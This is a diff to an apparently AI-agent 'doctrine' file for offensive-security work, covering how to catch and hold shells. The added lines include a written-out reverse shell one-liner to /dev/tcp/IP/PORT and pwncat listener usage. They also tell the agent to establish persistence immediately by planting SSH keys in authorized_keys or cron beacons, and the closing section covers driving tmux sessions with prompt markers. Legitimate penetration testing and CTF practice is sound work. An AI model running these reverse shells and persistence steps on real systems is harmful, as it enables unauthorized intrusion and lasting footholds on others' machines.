@@ -26,13 +26,42 @@ Doctrine:
   the next key, exactly as a human would look at the terminal before typing.
 - **Never** run a blocking/interactive command as a plain one-shot — it will hang the loop.
   If something might wait for input, it goes in tmux.
-- Hold a caught reverse shell in its own session and keep it alive. Stabilize it to a full
-  PTY before working in it.
+- **Catch reverse shells with `pwncat-cs -lp <port>`, not bare `nc -lvnp`** (it is installed). pwncat
+  auto-upgrades the PTY, gives a stable prompt, a synchronous command API, and — the part that matters
+  most — **reconnect + persistence**, so losing the shell is not losing your foothold. Hold it in its own
+  `<tmux_base>_<slug>` session and keep it alive.
+- **Make the callback non-blocking so the vector stays re-fireable — a required habit on the first
+  foothold, not an optimization.** A reverse shell fired *synchronously* (a worker/handler that calls
+  `system("… bash -i >& /dev/tcp/… …")` and then blocks) pins that process to the first shell: if the
+  shell drops, the vector can never fire again and only a target reset recovers it — this, not the PTY, is
+  why a dropped shell used to mean "reset the box". Always **detach** the callback:
+  `setsid bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1' &` — the exploit returns immediately and the shell
+  runs detached, so the vector keeps working.
+- **Establish stable re-entry the instant you land, before enumerating anything.** Convert a fragile
+  one-shot reverse shell into something reconnectable: drop an SSH key into `authorized_keys`, a
+  cron/scheduled beacon, or pwncat persistence — so re-entry becomes **SSH (stable, reconnectable)**, not
+  "re-run the exploit and hope". This is also the precondition for resume: `confirmed_path` re-walk
+  (`40-memory-and-state.md`) re-establishes the foothold on every relaunch, and a one-shot/blocking vector
+  breaks the re-walk.
 
 > Why tmux and not a fancier agent-runtime: tmux is zero-dependency, already present, and
 > battle-tested for exactly this (holding a shell open across many tool calls). The
 > multi-agent coordination that newer runtimes offer, you already get from Claude Code
 > sub-agents (`doctrine/50-subagents.md`). Don't add a moving part you don't need.
+
+## Driving an interactive session — wait for a marker, never guess a timeout
+
+`send-keys` then `sleep N` and hoping is how interactive work leaks tokens into re-work. Instead wait
+for a **deterministic marker** that proves the command actually finished; a timeout is only a safety
+backstop layered on top, never the mechanism. In order of preference:
+
+- **Let the tool give it to you.** pwncat's command API and `pexpect`'s `.expect(<prompt_regex>)` both
+  block until the prompt returns — a clean request/response loop. Reach for these for anything you drive
+  more than a couple of times (`pip install --user pexpect` if missing).
+- **Minimal, tmux-only (zero deps):** set a unique prompt on the session (`PS1='RC2>>> '`) and poll
+  `capture-pane` until that exact marker reappears. Prompt-as-marker — a few lines, no new dependency.
+
+Either way the rule is the same: block on *evidence the step completed*, not on a wall-clock guess.
 
 ## Tools — install, don't wait
 
